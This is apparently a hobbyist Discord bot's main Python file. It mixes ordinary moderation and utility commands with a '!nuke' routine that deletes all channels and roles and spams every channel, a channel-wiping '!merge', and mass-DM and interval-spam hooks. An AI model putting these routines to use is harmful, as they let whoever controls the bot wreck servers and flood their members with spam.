import discord
import asyncio
import os
import sys
import json
import platform
import random
import emoji as emoji_lib
from discord.utils import get
from collections import defaultdict
from datetime import datetime, timedelta
from diss_handler import handle_diss 
from mass_dm import handle_massdm
import time
import embed_command
from discord.ui import Select, View
from interval_spam import start_spam_manual, stop_spam_manual
from button_handler import add_button, remove_button
from ext_cmds import (
    handle_poll,
    handle_eightball,
    handle_serverinfo,
    handle_userinfo,
    handle_remind,
    handle_roleinfo
)
from discord.ext import commands
from utils.moderation_handler import ban_user, mute_user, kick_user
from flask import Flask
from threading import Thread
from dotenv import load_dotenv
from utils.role_handler import create_role, delete_role, rename_role, set_role_icon, toggle_user_role

start_time = datetime.utcnow()

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    raise ValueError("Bot token is missing. Make sure you set it in the .env file.")

# Replace with your Discord User ID
YOUR_USER_ID = 1212229549459374222

# Authorized users
AUTHORIZED_USERS = {YOUR_USER_ID, 845578292778238002, 1177672910102614127, 1255299171519561792, 1238152637959110679, 1088004084084256839}

OWNER_ID = 1212229549459374222

global MAINTENANCE_MODE, MAINTENANCE_END_TIME, MAINTENANCE_CANCELLED
MAINTENANCE_MODE = False
MAINTENANCE_END_TIME = None
MAINTENANCE_CANCELLED = False

# Set up intents
intents = discord.Intents.all()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.dm_messages = True
intents.voice_states = True

# Initialize bot
class discordbot(commands.Bot):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.user_skull_list = set()

# Initialize the bot
bot = discordbot(command_prefix="!", intents=intents, help_command=None)

# !help command
@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Help commands",
        description="⚠️ Use the dropdown below to view command help pages.",
        color=discord.Color.green()
    )
    # Send the first help page with the dropdown
    view = HelpView()
    await ctx.send(embed=embed, view=view)

# !authorized
@bot.command()
async def authorized(ctx):
    if ctx.author.id != YOUR_USER_ID:
        embed = discord.Embed(
            description="❌️ You do not have permission to view the authorized users list.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    authorized_users = [f'<@{user_id}>' for user_id in AUTHORIZED_USERS]
    embed = discord.Embed(
        title="✅️ Authorized Users",
        description="\n".join(authorized_users) if authorized_users else "⚠️ No users are authorized.",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

# !unauthorize <user>
@bot.command()
async def unauthorize(ctx, user: discord.User):
    if ctx.author.id != YOUR_USER_ID:
        embed = discord.Embed(
            description="❌️ You do not have permission to use this command.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    if user.id == ctx.author.id:
        embed = discord.Embed(
            description="❌️ You cannot unauthorize yourself.",
            color=discord.Color.red()
        )
    elif user.id in AUTHORIZED_USERS:
        AUTHORIZED_USERS.remove(user.id)
        embed = discord.Embed(
            description=f"✅️ {user.mention} has been unauthorized.",
            color=discord.Color.green()
        )
    else:
        embed = discord.Embed(
            description=f"‼️ {user.mention} is not in the authorized list.",
            color=discord.Color.red()
        )
    
    await ctx.send(embed=embed)

# !authorize <user>
@bot.command()
async def authorize(ctx, user: discord.User):
    if ctx.author.id != YOUR_USER_ID:  # Replace YOUR_USER_ID with your actual Discord user ID
        embed = discord.Embed(
            description="❌️ You do not have permission to use this command.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    if user.id not in AUTHORIZED_USERS:
        AUTHORIZED_USERS.add(user.id)
        embed = discord.Embed(
            description=f"✅️ {user.mention} has been authorized to use the commands.",
            color=discord.Color.green()
        )
    else:
        embed = discord.Embed(
            description=f"‼️ {user.mention} is already authorized.",
            color=discord.Color.red()
        )
    
    await ctx.send(embed=embed)


# Define the help pages
help_page_1 = (
    "**Available Commands (Page 1/3):**\n"
    "```diff\n"
    "[ Help command ]\n"
    "!help                                          - Show this help message.\n\n"
    "[ User & Server Info ]\n"
    "!userinfo [name]                               - Show info about a user.\n"
    "!roleinfo [role name]                          - Show info about a role.\n"
    "!serverinfo                                    - Show server statistics.\n"
    "!stats                                         - Show bot uptime and system statistics.\n\n"
    "[ Fun & Utility ]\n"
    "!eightball <question>                          - Ask the magic 8-ball a question.\n"
    "!poll <question>                               - Create a simple yes/no poll.\n"
    "!remind <sec> <msg>                            - Get a reminder after a given time.\n"
    "!bc <filters>                                  - Bulk delete messages with optional filters.\n"
    "!embed <channel> <code>                        - Sends an embed to the channel you need.\n"
    "!addbutton <message id> <link> <label>         - Creates a button to the bots message.\n"
    "!removebutton <message id> <label>             - removes a button from the bots message.\n"
    "!mock <user>                                   - Mocks a users text.\n"
    "```"
)

help_page_2 = (
    "**Available Commands (Page 2/3):**\n"
    "```diff\n"
    "[ Moderation ]\n"
    "!role @user <role>        - Add or remove a role from a user.\n"
    "!rolecreate <name> [#hex] - Create a new role with an optional color.\n"
    "!roledelete @role         - Delete a role.\n"
    "!rolerename @role <name>  - Rename a role.\n"
    "!roleicon @role <image>   - Set icon for a role using an attachment.\n"
    "!ban @user [reason]       - Ban a user from the server.\n"
    "!kick @user [reason]      - Kick a user from the server.\n"
    "!mute @user [reason]      - Mute a user with the mute role.\n\n"
    "[ Bot Status ]\n"
    "!setstatus <activity_type> <message> [--dnd | --idle | --invisible] - Set bot status & presence.\n"
    "[ Arguments for !setstatus ]\n"
    "status_type  : online | idle | dnd | invisible\n"
    "activity_type: playing | watching | listening | streaming\n"
    "message      : Custom message for the status.\n"
    "!statusclear : Reset the bot's status to default (online with no activity).\n"
    "Example:\n"
    "!setstatus playing Skulling the worthy --dnd  - Sets the bot to Playing 'Skulling the worthy'\n"
    "```"
)

help_page_3 = (
    "**Available Commands (Page 3/3):**\n"
    "```diff\n"
    "[ Admin Only ]\n"
    "!authorize @user          - Authorize a user to use skull commands.\n"
    "!unauthorize @user        - Remove a user's authorization.\n"
    "!authorized               - Show authorized users.\n"
    "!restart                  - Restart the bot.    (owner only).\n"
    "!maintenance <minutes>    - Enter maintenance mode (owner only).\n"
    "!cancelmaintenance        - Cancel maintenance mode (owner only).\n"
    "!nuke                     - Deletes all channels, roles, and renames it all & spams. (owner only).\n"
    "!merge                    - Deletes all channels, makes a merge channel (owner only).\n"
    "!massdm                   - mass dm server members using a message (auth users only).\n"
    "```"
)

# Create the dropdown/select menu
class HelpSelect(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Page 1", value="1"),
            discord.SelectOption(label="Page 2", value="2"),
            discord.SelectOption(label="Page 3", value="3"),
        ]
        super().__init__(placeholder="Select a page", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "1":
            await interaction.response.edit_message(content=help_page_1, view=self.view)
        elif self.values[0] == "2":
            await interaction.response.edit_message(content=help_page_2, view=self.view)
        elif self.values[0] == "3":
            await interaction.response.edit_message(content=help_page_3, view=self.view)

# Create the View to hold the Select menu
class HelpView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(HelpSelect())


@bot.command()
async def joinvc(ctx, channel_id: int):
    # Get the channel by ID
    channel = bot.get_channel(channel_id)
    if channel and isinstance(channel, discord.VoiceChannel):
        # Join the voice channel
        await channel.connect()
        await ctx.send(f'Joined {channel.name}!')
    else:
        await ctx.send('Invalid channel ID or not a voice channel.')

@bot.command()
async def leavevc(ctx):
    """Leave the voice channel."""
    if ctx.voice_client:  # Check if the bot is connected to a voice channel
        await ctx.voice_client.disconnect()
        await ctx.send("Disconnected from the voice channel.")
    else:
        await ctx.send("I am not in a voice channel!")

# Store last deleted message per channel
sniped_messages = {}

@bot.event
async def on_message_delete(message):
    if message.author.bot:
        return
    sniped_messages[message.channel.id] = {
        "content": message.content,
        "author": message.author,
        "time": message.created_at
    }

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)  # 1 use every 5 seconds per user
async def snipe(ctx):
    data = sniped_messages.get(ctx.channel.id)
    if data is None:
        await ctx.send("There's nothing to snipe.")
    else:
        embed = discord.Embed(
            description=data["content"],
            color=discord.Color.orange(),
            timestamp=data["time"]
        )
        embed.set_author(name=str(data['author']), icon_url=data['author'].avatar.url if data['author'].avatar else None)
        embed.set_footer(text="Sniped message")
        await ctx.send(embed=embed)

@snipe.error
async def snipe_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(
            title="You're too fast!",
            description=f"Try again in `{error.retry_after:.1f}` seconds.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# Keep-alive server using Flask
app = Flask(__name__)
@app.route('/joinvc', methods=['POST'])
def join_voice_channel():
    data = request.json
    channel_id = data.get('channel_id')

    if channel_id:
        # Trigger the joinvc command
        channel = bot.get_channel(channel_id)
        if channel and isinstance(channel, discord.VoiceChannel):
            asyncio.run(channel.connect())
            return jsonify({'message': f'Bot joined {channel.name}!'}), 200
        else:
            return jsonify({'error': 'Invalid channel ID or not a voice channel.'}), 400
    return jsonify({'error': 'Channel ID is required.'}), 400

@app.route('/')
def home():
    return "I'm alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

# In-memory dictionary for user-specific emoji reactions
auto_react_users = {}

# Helper: Validate emoji
def is_valid_emoji(emoji_str, bot):
    if emoji_lib.is_emoji(emoji_str):
        return True
    if emoji_str.startswith("<") and emoji_str.endswith(">"):
        try:
            emoji_id = int(emoji_str.split(":")[-1].replace(">", ""))
            return get(bot.emojis, id=emoji_id) is not None
        except:
            return False
    return False

# Auto-reaction logic
async def auto_react_to_messages(message, bot):
    emoji = auto_react_users.get(message.author.id)
    if emoji:
        try:
            # Convert emoji string to Emoji object if it's custom
            if emoji.startswith("<") and emoji.endswith(">"):
                emoji_id = int(emoji.split(":")[-1].replace(">", ""))
                emoji_obj = get(bot.emojis, id=emoji_id)
                if emoji_obj:
                    await message.add_reaction(emoji_obj)
                return
            # Else assume it's Unicode
            await message.add_reaction(emoji)
        except discord.HTTPException:
            pass  # Fail silently

# Main command handler
async def handle_react_command(message, bot):
    if not message.content.startswith("!react"):
        return

    if message.author.id not in AUTHORIZED_USERS:
        embed = discord.Embed(
            title="⛔ Unauthorized",
            description="You are not allowed to use this command.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    args = message.content.split()
    if message.content.strip() == "!react list":
        if not auto_react_users:
            embed = discord.Embed(
                title="📭 No Auto-Reacts Set",
                description="There are no users currently set to auto-react.",
                color=discord.Color.orange()
            )
        else:
            description = "\n".join(
                f"<@{uid}> → {emoji}" for uid, emoji in auto_react_users.items()
            )
            embed = discord.Embed(
                title="📋 Auto-React List",
                description=description,
                color=discord.Color.blue()
            )
        await message.channel.send(embed=embed)
        return

    if len(args) < 3 or not message.mentions:
        embed = discord.Embed(
            title="⚠️ Missing Arguments",
            description="Please mention a user and provide an emoji.\n```!react @user 😈```",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)
        return

    target = message.mentions[0]
    emoji = args[2]

    if not is_valid_emoji(emoji, bot):
        embed = discord.Embed(
            title="❌ Invalid Emoji",
            description="Please provide a valid emoji (Unicode or custom server emoji).\n```!react @user 😈```",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    if target.id in auto_react_users:
        del auto_react_users[target.id]
        embed = discord.Embed(
            title="❌ Auto-React Disabled",
            description=f"Removed auto-reactions for {target.mention}.",
            color=discord.Color.red()
        )
    else:
        auto_react_users[target.id] = emoji
        embed = discord.Embed(
            title="✅ Auto-React Enabled",
            description=f"{target.mention} will now receive auto-reactions with {emoji}.",
            color=discord.Color.green()
        )

    await message.channel.send(embed=embed)

async def handle_say(message):
    if message.author.id not in AUTHORIZED_USERS:
        embed = discord.Embed(
            description="❌ You are not authorized to use this command.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    try:
        await message.delete()
    except discord.Forbidden:
        await message.channel.send("⚠️ I don't have permission to delete messages.")
        return

    content = message.content.strip()
    command_prefix = "!say"

    say_message = content[len(command_prefix):].strip()
    if say_message:
        await message.channel.send(say_message)
    else:
        embed = discord.Embed(
            description="⚠️ You must provide a message to say.\n**Usage:** `!say <message>`",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)

async def handle_stats(message, bot, start_time):
    now = datetime.utcnow()
    uptime = now - start_time
    uptime_str = str(uptime).split('.')[0]

    latency = round(bot.latency * 1000)
    guild_count = len(bot.guilds)
    user_count = len(set(member.id for guild in bot.guilds for member in guild.members))

    embed = discord.Embed(title="🤖 Bot Stats", color=discord.Color.green())
    embed.add_field(name="Latency", value=f"{latency} ms", inline=True)
    embed.add_field(name="Uptime", value=uptime_str, inline=True)
    embed.add_field(name="Servers", value=f"{guild_count}", inline=True)
    embed.add_field(name="Users", value=f"{user_count}", inline=True)

    embed.set_footer(text=f"Requested by {message.author}", icon_url=message.author.display_avatar.url)
    await message.channel.send(embed=embed)

async def handle_restart(message):
    if message.author.id != YOUR_USER_ID:
        await message.channel.send("You are not authorized to restart the bot.")
        return

    confirm_message = await message.channel.send("Are you sure you want to restart the bot? Reply with `yes` or `no` within 15 seconds.")

    def check(m):
        return m.author == message.author and m.channel == message.channel and m.content.lower() in ["yes", "no"]

    try:
        reply = await message.client.wait_for("message", timeout=15.0, check=check)
        if reply.content.lower() == "yes":
            await message.channel.send("Restarting bot...")
            await message.client.close()
        else:
            await message.channel.send("Restart cancelled.")
    except asyncio.TimeoutError:
        await message.channel.send("No response. Restart cancelled.")


async def handle_maintenance(message, bot):
    global MAINTENANCE_MODE, MAINTENANCE_END_TIME, MAINTENANCE_CANCELLED

    if message.author.id != YOUR_USER_ID:
        embed = discord.Embed(
            description="⚠️ You are not authorized to use this command.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    args = message.content.split()
    if len(args) != 2:
        embed = discord.Embed(
            description="⚠️ Usage: `!maintenance <duration_in_minutes>`",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)
        return

    try:
        duration = int(args[1])
    except ValueError:
        embed = discord.Embed(
            description="⚠️ Please provide a valid number for duration.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    MAINTENANCE_MODE = True
    MAINTENANCE_END_TIME = datetime.utcnow() + timedelta(minutes=duration)
    MAINTENANCE_CANCELLED = False

    embed = discord.Embed(
        title="🛠️ Maintenance Mode Activated",
        description=f"The bot will be under maintenance for {duration} minute(s).",
        color=discord.Color.orange()
    )
    embed.set_footer(text="Only the bot owner can use commands during this time.")
    await message.channel.send(embed=embed)

    # Wait until maintenance time is over or cancelled
    for _ in range(duration * 60):
        if MAINTENANCE_CANCELLED:
            return
        await asyncio.sleep(1)

async def handle_cancel_maintenance(message):
    global MAINTENANCE_MODE, MAINTENANCE_END_TIME, MAINTENANCE_CANCELLED

    if message.author.id != YOUR_USER_ID:
        embed = discord.Embed(
            description="\u274C You are not authorized to cancel maintenance.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    if MAINTENANCE_MODE:
        MAINTENANCE_MODE = False
        MAINTENANCE_END_TIME = None
        MAINTENANCE_CANCELLED = True
        embed = discord.Embed(
            title="\u274C Maintenance Cancelled",
            description="The bot is no longer in maintenance mode.",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)
    else:
        embed = discord.Embed(
            description="\u2139 The bot is not currently in maintenance mode.",
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

async def handle_bc(message, args):
    if not message.author.guild_permissions.manage_messages:
        embed = discord.Embed(
            description="❌ You don't have the required **permission**: `Manage Messages`.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    if len(args) < 1:
        embed = discord.Embed(
            description="⚠️ Usage: `!bc <count> [contains <word>]`",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)
        return

    try:
        count = int(args[0])
    except ValueError:
        embed = discord.Embed(
            description="❌ The first argument must be a number.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    keyword = None
    if len(args) >= 3 and args[1].lower() == "contains":
        keyword = " ".join(args[2:])

    def check(msg):
        return keyword.lower() in msg.content.lower() if keyword else True

    deleted = await message.channel.purge(limit=count + 1, check=check)
    embed = discord.Embed(
        description=f"✅ Deleted **{len(deleted) - 1}** messages.",
        color=discord.Color.green()
    )
    await message.channel.send(embed=embed, delete_after=5)


# nuke command handler
nuke_cooldown = {}  # guild.id -> datetime of last nuke

async def handle_nuke_command(message, bot):
    YOUR_USER_ID = 1212229549459374222  # Replace with your actual user ID
    guild = message.guild

    # Cooldown check
    if guild.id in nuke_cooldown and datetime.utcnow() < nuke_cooldown[guild.id] + timedelta(minutes=10):
        cooldown_embed = discord.Embed(
            title="Cooldown Active",
            description="You must wait before nuking again.",
            color=discord.Color.dark_orange()
        )
        await message.channel.send(embed=cooldown_embed)
        return

    # Owner check
    if message.author.id != YOUR_USER_ID:
        await message.channel.send(embed=discord.Embed(
            title="Access Denied",
            description="Only the bot owner can use this command.",
            color=discord.Color.red()
        ))
        return

    def check(m):
        return m.author == message.author and m.channel == message.channel

    # Confirmation prompt
    confirm_embed = discord.Embed(
        title="⚠️ Nuke Confirmation",
        description="Do you want to proceed with the nuke?\nType `yes` or `no`.",
        color=discord.Color.red()
    )
    await message.channel.send(embed=confirm_embed)

    try:
        reply = await bot.wait_for("message", timeout=30.0, check=check)
        if reply.content.lower() != "yes":
            cancel_embed = discord.Embed(
                title="❎ Nuke Cancelled",
                description="You chose not to proceed.",
                color=discord.Color.dark_red()
            )
            await message.channel.send(embed=cancel_embed)
            return
    except asyncio.TimeoutError:
        await message.channel.send(embed=discord.Embed(
            title="⏳ Timeout",
            description="No confirmation received. Nuke cancelled.",
            color=discord.Color.dark_red()
        ))
        return

    original_channel = message.channel

    # Destructive animation
    try:
        nuke_embed = discord.Embed(
            title="☢️ Nuking Server...",
            description="Brace for impact...",
            color=discord.Color.blurple()
        )
        nuke_msg = await original_channel.send(embed=nuke_embed)
        await asyncio.sleep(1)
        for frame in ["💣", "💥", "🔥", "☠️", "💀"]:
            await nuke_msg.edit(embed=discord.Embed(
                title="☢️ Nuking Server...",
                description=frame,
                color=discord.Color.random()
            ))
            await asyncio.sleep(1)
    except:
        pass

    # Ask what to do
    question_embed = discord.Embed(
        title="Nuke Options",
        description=(
            "**Choose options to enable (type numbers, comma-separated):**\n"
            "`1` - Delete all channels & categories\n"
            "`2` - Delete all roles\n"
            "`3` - Create new channels\n"
            "`4` - Spam a message"
        ),
        color=discord.Color.orange()
    )
    await original_channel.send(embed=question_embed)

    try:
        option_msg = await bot.wait_for("message", timeout=60.0, check=check)
        options = option_msg.content.replace(" ", "").split(",")
    except asyncio.TimeoutError:
        await original_channel.send("Timed out.")
        return

    # Delete original channel
    try:
        await original_channel.delete()
    except:
        pass

    # Delete all channels
    if "1" in options:
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

    # Delete all roles
    if "2" in options:
        for role in guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except:
                pass

    # Create new channels
    if "3" in options:
        try:
            await message.author.send("How many channels to create?")
            count_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
            count = int(count_msg.content)

            await message.author.send("What should be the name of the new channels?")
            name_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
            name = name_msg.content

            for _ in range(count):
                await guild.create_text_channel(name)
        except:
            await message.author.send("Failed to create channels or invalid input.")

    # Spam messages
    if "4" in options:
        try:
            await message.author.send("What message should I spam?")
            spam_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
            spam_text = spam_msg.content

            await message.author.send("How many times?")
            spam_count_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
            spam_count = int(spam_count_msg.content)

            for channel in guild.text_channels:
                for _ in range(spam_count):
                    await channel.send(spam_text)
        except:
            await message.author.send("Spamming failed or invalid input.")

    # Update cooldown
    nuke_cooldown[guild.id] = datetime.utcnow()

    # Final message
    try:
        await message.author.send(embed=discord.Embed(
            title="✅ Nuke Completed",
            description="All selected actions have been executed.",
            color=discord.Color.green()
        ))
    except:
        pass

mocked_users = set()
authorized_user = AUTHORIZED_USERS

async def handle_mock_command(message):
    if not message.content.startswith("!mock"):
        return
        
    if not message.author.id in authorized_user:
        embed = discord.Embed(
            title="⛔ Unauthorized",
            description="You are not authorized to use this command.",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)
        return

    if message.content.startswith("!mock"):
        if message.mentions:
            target = message.mentions[0]
        else:
            target = message.author

        if target.id in mocked_users:
            mocked_users.remove(target.id)
            embed = discord.Embed(
                title="❌ Mocking Disabled",
                description=f"Mocking disabled for {target.mention}",
                color=discord.Color.red()
            )
        else:
            mocked_users.add(target.id)
            embed = discord.Embed(
                title="✅ Mocking Enabled",
                description=f"Mocking enabled for {target.mention}",
                color=discord.Color.green()
            )
        await message.channel.send(embed=embed)

async def mock_user_messages(message):
    if message.author.id in mocked_users and not message.content.startswith("!mock"):
        mocked = ''.join(
            c.upper() if i % 2 else c.lower() for i, c in enumerate(message.content)
        )
        await message.channel.send(mocked)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    print("AntiNuke system active.")
    await bot.change_presence(activity=discord.Game(name=".gg/mock !"))
    
@bot.command()
async def setstatus(ctx, activity_type: str, *, args: str):
    if ctx.author.id != YOUR_USER_ID:
            embed = discord.Embed(
                description="❌ You are not authorized to use this command.",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return

    # Default presence status
    status = discord.Status.online

    # Check for status flags
    flags = {
        '--dnd': discord.Status.dnd,
        '--idle': discord.Status.idle,
        '--invisible': discord.Status.invisible
    }

    for flag, flag_status in flags.items():
        if flag in args:
            status = flag_status
            args = args.replace(flag, '').strip()
            break  # only one status flag at a time

    # Set activity
    activity = None
    activity_type_lower = activity_type.lower()

    if activity_type_lower == 'playing':
        activity = discord.Game(name=args)
    elif activity_type_lower == 'watching':
        activity = discord.Activity(type=discord.ActivityType.watching, name=args)
    elif activity_type_lower == 'listening':
        activity = discord.Activity(type=discord.ActivityType.listening, name=args)
    elif activity_type_lower == 'streaming':
        activity = discord.Activity(type=discord.ActivityType.streaming, name=args, url="https://twitch.tv/your_channel")
    else:
        return await ctx.send("Invalid activity type! Choose from: playing, watching, listening, streaming.")

    # Change bot presence
    await bot.change_presence(status=status, activity=activity)

    embed = discord.Embed(
        title="✅ Status Updated",
        description=f"**Type:** {activity_type.capitalize()}\n**Message:** {args}\n**Presence:** {status.name.capitalize()}",
        color=discord.Color.green()
    )
    sent = await ctx.send(embed=embed)
    await ctx.message.delete()
    await asyncio.sleep(5)
    await sent.delete()

async def handle_statusclear(message, bot):
    if message.content.startswith("!statusclear"):
        if message.author.id != YOUR_USER_ID:
            embed = discord.Embed(
                description="❌ You are not authorized to clear the bot's status.",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return

        await bot.change_presence(activity=discord.Game(name=".gg/mock !"))

        embed = discord.Embed(
            description="✅ Bot status has been cleared.",
            color=discord.Color.green()
        )
        confirmation = await message.channel.send(embed=embed)

        try:
            await message.delete()
            await asyncio.sleep(5)
            await confirmation.delete()
        except discord.Forbidden:
            pass

async def handle_servers_command(message, bot):
    if message.content == "!servers" and message.author.id == YOUR_USER_ID:
        guilds = bot.guilds
        description = "\n".join([f"**{guild.name}** (ID: `{guild.id}`)" for guild in guilds])

        embed = discord.Embed(
            title="🛰️ Servers I'm In",
            description=description or "No servers found.",
            color=discord.Color.blurple()
        )
        await message.channel.send(embed=embed)

# Function to check if the user is the bot owner
def is_owner(ctx):
    return ctx.author.id == YOUR_USER_ID

# Command to start spamming (only available to bot owner)
@bot.command()
async def startspam(ctx, interval: int, *, spam_message: str):
    """Command version: !startspam 10 Hello World"""
    if not is_owner(ctx):
        await ctx.send("You do not have permission to use this command.")
        return
    await start_spam_manual(ctx.channel, interval, spam_message)

    embed = discord.Embed(
        title="Started Spamming!",
        description=f"Spamming every {interval} seconds with:\n`{spam_message}`",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.event
async def on_message(message):
    
    # Ignore DMs to prevent 'User' attribute errors
    if message.guild is None:
        return

    if message.author == bot.user:
        return

    # Apply auto-reaction if user is in auto_react_users
    await auto_react_to_messages(message, bot)
    # React command handling
    await handle_react_command(message, bot)

    await handle_diss(message) 
    await handle_servers_command(message, bot)

    await handle_statusclear(message, bot)

    # Call the mock command handler
    await handle_mock_command(message)
    await mock_user_messages(message)

    await bot.process_commands(message)
    await embed_command.handle_embed_command(message, bot)

    if message.content.startswith("!massdm"):
        await handle_massdm(message)
        
    if message.content.lower().startswith("!stats"):
        await handle_stats(message, bot, start_time)
        return

    if message.content.lower().startswith("!restart"):
        await handle_restart(message)
        return

    if message.content.startswith("!say"):
        await handle_say(message)
        return

    if isinstance(message.channel, discord.DMChannel):
        print(f"DM from {message.author}: {message.content}")

    if message.content.startswith("!nuke"):
        await handle_nuke_command(message, bot)

    if message.content.startswith("!merge") and message.author.id == YOUR_USER_ID:
        def check(m):
            return m.author == message.author and m.channel == message.channel

        # Ask for new channel name
        embed = discord.Embed(
            title="🔧 Merge Setup",
            description="What should the **new channel** be named?",
            color=discord.Color.blurple()
        )
        prompt = await message.channel.send(embed=embed)

        try:
            name_msg = await bot.wait_for("message", timeout=60.0, check=check)
            new_channel_name = name_msg.content.strip()
        except asyncio.TimeoutError:
            timeout_embed = discord.Embed(
                title="⏳ Timeout",
                description="You took too long to respond. Merge cancelled.",
                color=discord.Color.red()
            )
            return await message.channel.send(embed=timeout_embed)

        # Ask for message to send
        embed = discord.Embed(
            title="📝 Merge Setup",
            description="What message should I send in the new channel?",
            color=discord.Color.blurple()
        )
        await message.channel.send(embed=embed)

        try:
            msg = await bot.wait_for("message", timeout=60.0, check=check)
            final_msg = msg.content
        except asyncio.TimeoutError:
            timeout_embed = discord.Embed(
                title="⏳ Timeout",
                description="You took too long to respond. Merge cancelled.",
                color=discord.Color.red()
            )
            return await message.channel.send(embed=timeout_embed)

        # Ask for confirmation
        embed = discord.Embed(
            title="⚠️ Confirm Merge",
            description=f"**This will delete ALL channels, including this one!**\n\n"
                        f"➡️ New Channel: `{new_channel_name}`\n"
                        f"🗨️ Message:\n>>> {final_msg}\n\n"
                        f"Type `Yes` to confirm or `No` to cancel.",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)

        try:
            confirm = await bot.wait_for("message", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            timeout_embed = discord.Embed(
                title="⏳ Timeout",
                description="You didn't respond in time. Merge cancelled.",
                color=discord.Color.red()
            )
            return await message.channel.send(embed=timeout_embed)

        if confirm.content.lower() != "yes":
            cancel_embed = discord.Embed(
                title="❎ Merge Cancelled",
                color=discord.Color.red()
            )
            return await message.channel.send(embed=cancel_embed)

        # Delete all channels
        for channel in message.guild.channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")

        # Create the new channel and send the message
        new_channel = await message.guild.create_text_channel(new_channel_name)
        await new_channel.send(final_msg)

    # Ban command
    if message.content.startswith("!ban"):
        if not any(perm[1] for perm in message.author.guild_permissions if perm[0] in ["ban_members"]):
            return await message.channel.send("You don't have permission to ban members.")

        args = message.content.split()
        if len(args) < 3 or not message.mentions:
            embed = discord.Embed(
                title="Command : !ban",
                description="**Usage:**\n"
                            "```!ban @user Reason```",
                color=discord.Color.blue()
            )
            return await message.channel.send(embed=embed)

        member = message.mentions[0]
        reason = ' '.join(args[2:])

        await ban_user(
            ctx_author=message.author,
            bot_member=message.guild.me,
            guild=message.guild,
            member=member,
            reason=reason,
            channel=message.channel
        )

    # Mute command
    if message.content.startswith("!mute"):
        if not any(perm[1] for perm in message.author.guild_permissions if perm[0] in ["manage_roles", "kick_members", "ban_members"]):
            return await message.channel.send("You don't have permission to mute members.")

        args = message.content.split()
        if len(args) < 3 or not message.mentions:
            embed = discord.Embed(
                title="Command : !mute",
                description="**Usage:**\n"
                            "```!mute @user Reason```",
                color=discord.Color.blue()
            )
            return await message.channel.send(embed=embed)

        member = message.mentions[0]
        reason = ' '.join(args[2:])

        await mute_user(
            ctx_author=message.author,
            bot_member=message.guild.me,
            guild=message.guild,
            member=member,
            reason=reason,
            channel=message.channel
        )

    # Kick command
    if message.content.startswith("!kick"):
        if not any(perm[1] for perm in message.author.guild_permissions if perm[0] in ["kick_members"]):
            return await message.channel.send("You don't have permission to kick members.")

        args = message.content.split()
        if len(args) < 3 or not message.mentions:
            embed = discord.Embed(
                title="Command : !kick",
                description="**Usage:**\n" 
                            "```!kick @user Reason```",
                color=discord.Color.blue()
            )
            return await message.channel.send(embed=embed)

        member = message.mentions[0]
        reason = ' '.join(args[2:])

        await kick_user(
            ctx_author=message.author,
            bot_member=message.guild.me,
            guild=message.guild,
            member=member,
            reason=reason,
            channel=message.channel
        )
  
    args = message.content.split()
     # Check if the author is a Member and has moderation permissions
    if isinstance(message.author, discord.Member):
        has_mod_perms = any([
            message.author.guild_permissions.manage_roles,
            message.author.guild_permissions.kick_members,
            message.author.guild_permissions.ban_members
        ])
    else:
        has_mod_perms = False  # If the author is not a Member, they have no permissions

    if not has_mod_perms:
        await bot.process_commands(message)
        return

    # !rolecreate
    if message.content.startswith("!rolecreate"):
        if len(args) < 2:
            return await message.channel.send(embed=discord.Embed(
                title="Command : !rolecreate",
                description="**Usage:**\n"
                            "```!rolecreate <name> [#hexcolor]```",
                color=discord.Color.blue()
            ))

        name = args[1]
        hex_color = args[2] if len(args) > 2 else "#3498db"
        try:
            color = discord.Color(int(hex_color.strip("#"), 16))
